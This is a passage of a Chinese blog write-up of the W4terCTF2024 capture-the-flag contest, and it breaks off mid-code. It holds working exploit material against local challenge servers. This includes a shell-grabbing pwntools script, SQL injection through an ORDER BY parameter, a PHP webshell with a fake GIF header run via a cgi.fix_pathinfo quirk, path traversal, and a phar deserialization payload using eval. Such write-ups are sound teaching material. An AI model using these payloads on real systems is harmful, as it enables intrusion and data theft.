<!-- build time:Thu Jan 16 2025 23:55:15 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="google-site-verification" content="7QiG8wJPa5_9Ca0Y8hlhT0rJtNqEekDbao8u-zvq7zA"><meta name="msvalidate.01" content="9A952D9AAB23A5CE98B20FC76E335FA6"><meta name="yandex-verification" content="cb2a7fddf83f1d59"><link rel="alternate" type="application/rss+xml" title="taf.fyi" href="https://taf.fyi/rss.xml"><link rel="alternate" type="application/atom+xml" title="taf.fyi" href="https://taf.fyi/atom.xml"><link rel="alternate" type="application/json" title="taf.fyi" href="https://taf.fyi/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="ctf"><link rel="canonical" href="https://taf.fyi/cs/ctf/w4terctf2024/"><title>W4terCTF2024 WP - CTF - 计算机科学 |</title><script src="https://unpkg.com/typed.js@2.1.0/dist/typed.umd.js" async></script><meta name="generator" content="Hexo 7.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><a><span id="motto" itemprop="name headline" class="motto"></span></a><h1 itemprop="name headline">W4terCTF2024 WP</h1><div class="meta"><span class="item" title="Created: 2024-05-05 00:00:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">Posted on</span> <time itemprop="dateCreated datePublished" datetime="2024-05-05T00:00:00+08:00">2024-05-05</time> </span><span class="item" title="Symbols count in article"><span class="icon"><i class="ic i-pen"></i> </span><span class="text">Symbols count in article</span> <span>52k</span> <span class="text">words</span> </span><span class="item" title="Reading time"><span class="icon"><i class="ic i-clock"></i> </span><span class="text">Reading time</span> <span>47 mins.</span></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="Toggle navigation bar"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">taf.fyi</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><img src="/assets/cs/ctf/w4terctf2024/cover.png"></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">Home</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/cs/" itemprop="item" rel="index" title="In 计算机科学"><span itemprop="name">计算机科学</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/cs/ctf/" itemprop="item" rel="index" title="In CTF"><span itemprop="name">CTF</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="en"><link itemprop="mainEntityOfPage" href="https://taf.fyi/cs/ctf/w4terctf2024/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="fuuzen"><meta itemprop="description" content="taf.fyi, fuuzen 的个人主页 taf.fyi"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="taf.fyi"></span><div class="body md" itemprop="articleBody"><p>年轻人的第一场 CTF ，学到了很多，比较走运拿了第五。最遗憾的是密码学板块了，认真学了不少抽象代数但还是没有做出几题。</p><p><img data-src="/assets/cs/ctf/w4terctf2024/rank.png" alt="rank"></p><p>队友们：（我起了个整活队名，其实是抄袭另一个叫做 “憧憬成为 CTFer” 的 ）</p><p><img data-src="/assets/cs/ctf/w4terctf2024/team.jpg" alt="team"></p><h1 id="ai"><a class="anchor" href="#ai">#</a> AI</h1><h2 id="network-reverse"><a class="anchor" href="#network-reverse">#</a> Network Reverse</h2><p>网络结构长这样：</p><p></p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Sequential(</span><br><span class="line">  (<span class="number">0</span>): Conv2d(<span class="number">3</span>, <span class="number">4</span>, kernel_size=(<span class="number">2</span>, <span class="number">2</span>), stride=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">  (<span class="number">1</span>): GELU(<span class="name">approximate=</span>&#x27;none&#x27;)</span><br><span class="line">  (<span class="number">2</span>): Conv2d(<span class="number">4</span>, <span class="number">8</span>, kernel_size=(<span class="number">5</span>, <span class="number">5</span>), stride=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">  (<span class="number">3</span>): GELU(<span class="name">approximate=</span>&#x27;none&#x27;)</span><br><span class="line">  (<span class="number">4</span>): MaxPool2d(<span class="name">kernel_size=3</span>, stride=3, padding=0, dilation=1, ceil_mode=False)</span><br><span class="line">  (<span class="number">5</span>): Linear(<span class="name">in_features=412</span>, out_features=1848, bias=True)</span><br><span class="line">  (<span class="number">6</span>): Conv2d(<span class="number">8</span>, <span class="number">1</span>, kernel_size=(<span class="number">1</span>, <span class="number">1</span>), stride=(<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">  (<span class="number">7</span>): Tanh()</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p></p><p>首先，卷积和池化层只会在图像中的一个较小的局部内用某种方式抹一把，并不会比如说把 W 的上半部分丢到另一个地方去，<strong>不会破坏可辨识的字体形状</strong>，所以卷积和池化层可以直接当做不存在。</p><p>第一层 <code>atan()</code> 没有难度，第三层给 <code>weight</code> 求个逆即可逆向：</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse</span>(<span class="params">ts</span>):</span><br><span class="line">    ts = torch.atanh(ts)</span><br><span class="line">    C = ts</span><br><span class="line">    A = net[<span class="number">5</span>].weight.transpose(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    ts = C @ torch.pinverse(A)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ts</span><br></pre></td></tr></table></figure><p></p><p>上面这个函数逆向出来长这样：</p><p><img data-src="https://s2.loli.net/2024/04/29/mUBcnEN2zCRShaO.png" alt="network-reverse1"></p><p>感觉行之间的梯度非常小，不如来个竖直方向的锐化滤波器试试？</p><p></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mat = np.array(reverse(tensor).detach().numpy()[<span class="number">0</span>])</span><br><span class="line">kernel = np.array([[<span class="number">0</span>, -<span class="number">1</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>], [<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>]], dtype=np.float32)</span><br><span class="line">filtered = cv2.filter2D(mat, -<span class="number">1</span>, kernel)</span><br><span class="line"></span><br><span class="line">plt.imshow(filtered, cmap=<span class="string">&#x27;gray&#x27;</span>)</span><br></pre></td></tr></table></figure><p></p><p><img data-src="https://s2.loli.net/2024/04/29/qiCOuyBTSU7KXw6.png" alt="network-reverse2"></p><p>啊？</p><h1 id="pwn"><a class="anchor" href="#pwn">#</a> Pwn</h1><h2 id="remember-it-0"><a class="anchor" href="#remember-it-0">#</a> Remember It 0</h2><p>签到题，自动化脚本获取 flag：</p><p></p><figure class="highlight python"><figcaption><span>ipynb</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">50184</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Your choice: &quot;</span>, drop=<span class="literal">False</span>)</span><br><span class="line">    p.send(<span class="string">&quot;1\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;: &quot;</span>, drop=<span class="literal">False</span>)</span><br><span class="line">    x = p.recvuntil(<span class="string">&quot;\x08&quot;</span>, drop=<span class="literal">False</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;plz input your answer\n&quot;</span>, drop=<span class="literal">False</span>)</span><br><span class="line">    x = x[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    p.send(x)</span><br><span class="line">p.send(<span class="string">&quot;cat flag\n&quot;</span>)</span><br><span class="line">flag = p.recvuntil(<span class="string">&quot;&#125;&quot;</span>, drop=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p></p><p><code>W4terCTF&#123;THOU9h_l_Hav3_tO_SAy_g0oD8y3~&#125;</code></p><h2 id="remember-it-1"><a class="anchor" href="#remember-it-1">#</a> Remember It 1</h2><p>无保护，可以栈溢出。</p><p><img data-src="https://s2.loli.net/2024/04/29/qcsDAJHgp5bZNeR.png" alt="Remember-It-1-1"></p><p><code>read</code> 一次读 32 字节，缓冲区有 10 * 32 字节，按理来说只有十轮游戏就不会越界，然而并没有超过十轮退出游戏的逻辑，十轮之后可以接着下一轮，这时读到的东西就越过缓冲区了。</p><p>比较菜，没用明白 <code>pwntools</code> ，是手搓十六进制编辑器作为输入，开着 gdb 一点一点试出来的。payload 如下：</p><p><img data-src="https://s2.loli.net/2024/04/29/nU18YoKDFALga5s.png" alt="Remember-It-1-2"></p><p>前面是一堆 <code>1\nAAAABBBB...\n</code> 用来跳过前十轮，第十一轮读指针已经位于栈顶附近，把 <code>FEE1DEAD</code> 的地址 <code>0xB61840</code> 放在 <code>$rbp</code> 指向的位置，然后用垃圾填满 32 字节结束本次 <code>read</code> ，下一轮选 4 退出游戏， <code>main</code> 返回，就会到达 <code>FEE1DEAD</code> 。</p><h2 id="2048"><a class="anchor" href="#2048">#</a> 2048</h2><p>ISTG 我真的只是随便敲了一坨输入进去，然后直接弹了句 <code>sh: 1: xxxxxx: not found</code> 给我整不会了。</p><p>下面是可以稳定 getshell 的 payload：</p><p><img data-src="https://s2.loli.net/2024/04/29/e5u37tTcN1jqFOy.png" alt="2048"></p><h1 id="web"><a class="anchor" href="#web">#</a> Web</h1><h2 id="gitzip"><a class="anchor" href="#gitzip">#</a> GitZip</h2><p>重新做了一遍：</p><p><img data-src="https://s2.loli.net/2024/04/29/cTfr4Qmi1jK5zeN.png" alt="gitzip1"></p><p>漏洞大概是这里：</p><p><img data-src="https://s2.loli.net/2024/04/29/j5ZdYeMpEIBiL2a.png" alt="gitzip2"></p><p>要把 <code>.</code> 和 <code>/</code> 都用 <code>%</code> 编码才能过， <code>/</code> 也要编码是我没想到的，大概是针对每一层 <code>/</code> 的处理会包含一些奇怪的特殊步骤，需要把 <code>/</code> 编码掉来跳过这些步骤，让完整的路径字符串直达 <code>req.params.htmlname</code> 。</p><h2 id="ashbp"><a class="anchor" href="#ashbp">#</a> ASHBP</h2><p>查看源代码，首先全局搜索 <code>flag</code> ，马上就找到可以直接得到 flag 的 <code>get_flag</code> 函数：</p><p></p><figure class="highlight php"><figcaption><span>download.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">rsa_decrypt</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p><p>同时在 <code>init.sh</code> 中可以看到 flag 的位置：</p><p></p><figure class="highlight bash"><figcaption><span>init.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$GZCTF_FLAG</span> &gt; /tmp/flag</span><br><span class="line"><span class="built_in">chmod</span> 444 /tmp/flag</span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> GZCTF_FLAG</span><br><span class="line"></span><br><span class="line"><span class="built_in">base64</span> /var/www/html/src/rsa.pem &gt; /var/www/html/src/rsa_base64.pem</span><br><span class="line"><span class="built_in">base64</span> /var/www/html/src/rsa_pub.pem &gt; /var/www/html/src/rsa_pub_base64.pem</span><br><span class="line"></span><br><span class="line">php-fpm -D</span><br><span class="line">nginx -g <span class="string">&#x27;daemon off;&#x27;</span></span><br></pre></td></tr></table></figure><p></p><p>flag 位置为 <code>/tmp/flag</code> ；</p><p>全局搜索 <code>get_flag</code> 找到调用该函数的地方：</p><p></p><figure class="highlight php"><figcaption><span>admin.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;rsa.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;download.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cre&#x27;</span>])&#123;    </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">rsa_decrypt</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cre&#x27;</span>])!=<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;凭据无效！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p></p><p>查看 <code>rsa_decrypt</code> 解密的逻辑：</p><p></p><figure class="highlight php"><figcaption><span>rsa.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rsa_decrypt</span>(<span class="params"><span class="variable">$endata</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//私钥解密</span></span><br><span class="line">    <span class="variable">$private_key</span> = <span class="title function_ invoke__">openssl_pkey_get_private</span>(<span class="title function_ invoke__">file_get_contents</span>(PRIVATE_PATH));</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$private_key</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;私钥不可用&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$return_de</span> = <span class="title function_ invoke__">openssl_private_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$endata</span>), <span class="variable">$decrypted</span>, <span class="variable">$private_key</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$return_de</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>(<span class="string">&#x27;解密失败,请检查RSA秘钥&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decrypted</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>下载公钥 <code>rsa_pub.pem</code> ，RSA 加密后再 base64 加密 <code>admin</code> 和 <code>/tmp/flag</code> ，分别作为 <code>cre</code> 和 <code>flag</code> ， POST 获取 flag ：</p><p></p><figure class="highlight shell"><figcaption><span>hack.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">export cre=$(echo admin | openssl rsautl -encrypt -inkey rsa_pub.pem -pubin | base64)</span><br><span class="line"></span><br><span class="line">export flag=$(echo flag | openssl rsautl -encrypt -inkey rsa_pub.pem -pubin | base64)</span><br><span class="line"></span><br><span class="line">curl -X POST -F &quot;cre=$cre&quot; -F &quot;flag=$flag&quot; http://127.0.0.1:50741/admin.php</span><br></pre></td></tr></table></figure><p></p><p><code>W4terCTF&#123;Unl0ck_7he_sECreTs_O1_tHE_s1MPle_hOMEw0rk_SUbm1Ssion_PLATfoRM&#125;</code></p><h2 id="user-manager"><a class="anchor" href="#user-manager">#</a> User Manager</h2><p></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">r.GET(<span class="string">&quot;/users&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> users []User</span><br><span class="line">    orderBy := c.Query(<span class="string">&quot;order_by&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> orderBy == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">        orderBy = <span class="string">&quot;id asc&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    db.Order(orderBy).Find(&amp;users)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i := <span class="keyword">range</span> users &#123;</span><br><span class="line">        users[i].Secret = <span class="string">&quot;hidden www~~&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    c.JSON(http.StatusOK, users)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p></p><p>这里 <code>orderBy</code> 直接来自用户输入，而 GORM 文档写道：</p><p><img data-src="https://s2.loli.net/2024/04/29/RusG1mrbDpxjyTC.png" alt="user-manager"></p><p><span class="exturl" data-url="aHR0cHM6Ly9nb3JtLmlvL3poX0NOL2RvY3Mvc2VjdXJpdHkuaHRtbA==">安全 | GORM - The fantastic ORM library for Golang, aims to be developer friendly.</span></p><p>看起来 <code>db.Order(string)</code> 会把 <code>string</code> 直接拼在 SQL 语句的 <code>ORDER BY</code> 后面，于是加了个 <code>;</code> ，在后面注入了一句 <code>UPDATE</code> ，把所有用户的 <code>name</code> 改为自己的 <code>secret</code> ，下一次直接 GET 即可从用户的 <code>name</code> 字段拿到 flag。</p><h2 id="png-server"><a class="anchor" href="#png-server">#</a> PNG Server</h2><p><code>php.ini</code> 中存在漏洞：</p><p></p><figure class="highlight php"><figcaption><span>php.ini</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cgi.fix_pathinfo = <span class="number">1</span></span><br></pre></td></tr></table></figure><p></p><p>这个设置会导致所请求的 <code>.php</code> 文件不存在就会跳到上一层的路径查找文件，比如说 <code>http://....../.php</code> ，那么就可以确定我们需要上传一个 php 文件</p><p>源代码中用 <code>isImage</code> 来判断上传文件是否为图片，这里的检查非常随便，存在漏洞:</p><p></p><figure class="highlight php"><figcaption><span>index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$imgPath</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$file</span>  = <span class="title function_ invoke__">fopen</span>(<span class="variable">$imgPath</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span>  = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);</span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>] . <span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);</span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$typeCode</span> == <span class="number">255216</span> || <span class="variable">$typeCode</span> == <span class="number">7173</span> || <span class="variable">$typeCode</span> == <span class="number">13780</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$typeCode</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>只需要在 php 木马前加上 <code>GI</code> （ 2 个字节对应 <code>7173</code> ）就可以通过检查，写一个返回 flag 的 php 木马：</p><p></p><figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GI&lt;?php</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">currentDirectory = <span class="built_in">realpath</span>(<span class="built_in">dirname</span>(__FILE__));</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">flag_path = <span class="built_in">realpath</span>(<span class="variable">$currentDirectory</span> . <span class="string">&#x27;/../../../../../flag&#x27;</span>);</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">flag = fopen(<span class="variable">$flag_path</span> , <span class="string">&#x27;r&#x27;</span>);</span></span><br><span class="line">if ($flag) &#123;</span><br><span class="line">    $content = fread($flag, filesize($flag_path));</span><br><span class="line">    echo $content;</span><br><span class="line">    fclose($flag);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;无法打开文件 $filename&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p><p>然后上传该文件，文件已经被改名为了 md5 随机码，F12 找到该文件的 url ：</p><p><img data-src="https://s2.loli.net/2024/04/29/LRhQcpyB2oZPMkq.png" alt="LRhQcpyB2oZPMkq"></p><p>然后在该 url 后面加上 <code>/.php</code> 就可以执行该 php 木马：</p><p><img data-src="https://s2.loli.net/2024/04/29/t6FA2a8iX9OwGog.png" alt="t6FA2a8iX9OwGog"></p><p><code>W4terCTF&#123;uPL04Ds_ar3_0UR_vlC3_RCE_WwwWWw&#125;</code></p><h2 id="auto-unserialize"><a class="anchor" href="#auto-unserialize">#</a> Auto Unserialize</h2><p>首先在盲目找线索的阶段我是用 <code>GET</code> 方法得到 flag 的位置的：</p><p></p><figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;http://127.0.0.1:54018/?img_file=../../../flag&quot;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Return Success</span></span><br></pre></td></tr></table></figure><p></p><p>直到我看到了参考资料：<span class="exturl" data-url="aHR0cHM6Ly9wYXBlci5zZWVidWcub3JnLzY4MC8=">reference</span></p><p>首先可能先需要：</p><p></p><figure class="highlight shell"><figcaption><span>shell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php --ini</span><br></pre></td></tr></table></figure><p></p><p>找到 <code>php.ini</code> 加上这一行：</p><p></p><figure class="highlight ini"><figcaption><span>php.ini</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">phar.readonly</span> = <span class="literal">Off</span><span class="comment">;</span></span><br></pre></td></tr></table></figure><p></p><p>构造 payload <code>phar.phar</code> 文件用的 <code>phar_gen.php</code> ：</p><p></p><figure class="highlight php"><figcaption><span>phar_gen.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">command_test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$command</span> = <span class="string">&quot;echo file_get_contents(&#x27;../../../flag&#x27;);&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;command);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub, 增加gif文件头，伪造文件类型</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">command_test</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span 